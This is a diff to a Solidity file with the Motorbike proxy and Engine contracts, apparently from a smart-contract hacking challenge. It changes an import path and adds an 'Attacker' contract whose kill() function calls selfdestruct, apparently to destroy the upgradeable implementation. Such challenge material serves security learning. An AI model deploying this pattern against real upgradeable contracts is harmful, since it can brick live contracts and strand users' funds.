@@ -3,7 +3,7 @@
 pragma solidity <0.7.0;
 
 import "@openzeppelin/contracts/utils/Address.sol";
-import "@openzeppelin/contracts/proxy/Initializable.sol";
+import "./openzeppelin/contracts/proxy/Initializable.sol";
 
 contract Motorbike {
     // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
@@ -100,5 +100,11 @@ contract Engine is Initializable {
             r_slot := _IMPLEMENTATION_SLOT
         }
         r.value = newImplementation;
+    }
+}
+
+contract Attacker  {
+    function kill() public {
+        selfdestruct(tx.origin);
     }
 }
